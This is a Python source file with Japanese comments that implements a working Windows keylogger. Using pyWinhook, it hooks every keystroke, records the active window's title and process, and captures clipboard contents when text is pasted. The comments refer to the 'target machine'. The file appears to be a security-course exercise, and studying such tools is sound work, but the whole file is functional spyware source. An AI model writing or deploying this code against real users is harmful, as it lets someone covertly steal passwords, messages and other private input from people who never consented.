#キーロガー
#キー入力を記録する
#python3.8以前でないとpyWinhookをインストールできない

from ctypes import byref, create_string_buffer,  c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard


TIMEOUT = 60 * 10


class KeyLogger:
    def __init__(self):
        self.current_window = None

    #アクティブなウィンドウと、それに関連付けられたプロセスIDを取得する
    def get_current_process(self):
        #標的マシンのデスクトップ上でアクティブなウィンドウへのハンドルを返す
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        #ウィンドウのプロセスIDを得る
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        #プロセスを開く
        h_process = windll.kernel32.OpenProcess(
            0x400 | 0x10, False, pid)
        #プロセスハンドルを使って、実行ファイルのファイル名を特定する
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        #ウィンドウのタイトルバーを取得
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        #どのプロセスのウィンドウに対してキー入力が行われたかを明確にするため、取得したすべての情報とヘッダーを出力
        print('\n', process_id, executable.value.decode(),
              self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    #キーボードが押下されるたびに、イベントオブジェクトを伴った形で呼び出される
    def mykeystroke(self, event):
        #利用者がウィンドウを変更したかどうかをチェック
        if event.WindowName != self.current_window:
            self.get_current_process()
        #押下されたキーをチェックし、ASCIIの印字可能な文字なら出力
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            #貼り付けならクリップボードを出力
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            #それ以外のキー
            else:
                print(f'{event.Key}')
        return True


#実行関数
def run():
    #stdoutへの書き込みを、後に指定するファイルオブジェクトへ変更する
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    #keyloggerオブジェクトを作成し、pyWinHookのHookManagerを定義
    kl = KeyLogger()
    hm = pyHook.HookManager()
    #KeyDownイベントをKeyLoggerのコールバックメソッドmykeystroke
    hm.KeyDown = kl.mykeystroke
    #pyWinHookにすべてのキーボード押下をフックさせ、タイムアウトになるまで実行を継続
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print('done.')